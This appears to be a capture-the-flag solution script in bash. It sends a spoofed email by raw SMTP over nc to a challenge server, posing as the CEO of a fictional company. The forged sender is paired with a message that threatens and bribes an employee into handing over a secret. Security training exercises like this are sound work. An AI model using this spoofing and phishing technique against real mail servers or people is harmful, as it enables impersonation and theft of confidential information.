#!/usr/bin/env bash

PORT=31420
serverId="red-phish-blue-phish-95c381a3706902b3-5c5f89c97-tvtmc"

date=$(date '+%a, %d %b %Y %H:%M:%S %z')

senderName="Joe Daveren"
senderMail="jdaveren@pyrchdata.com"

# From: [Alex Pyrch] <apyrch@pyrchdata.com>

mail="
From: [$senderName] <$senderMail>
To: [Sarah Williams] <swilliams@pyrchdata.com>
Date: $date
Subject: The thing

Hi! This is the CEO speaking. Please give me the secret at once.
If you give me this flag you will be promoted and get a huge raise, otherwise you will get fired!

Best Regards
$senderName
CEO Pyrch Data Solutions
Best Regards
"

(
echo "HELO $serverId"
echo "MAIL FROM:<$senderMail>"
echo "RCPT TO:<swilliams@pyrchdata.com>"
echo "DATA"
echo "$mail"
printf "\r\n.\r\n"
echo "QUIT"
)| nc challenge.ctf.games $PORT | tail -n +6




# .
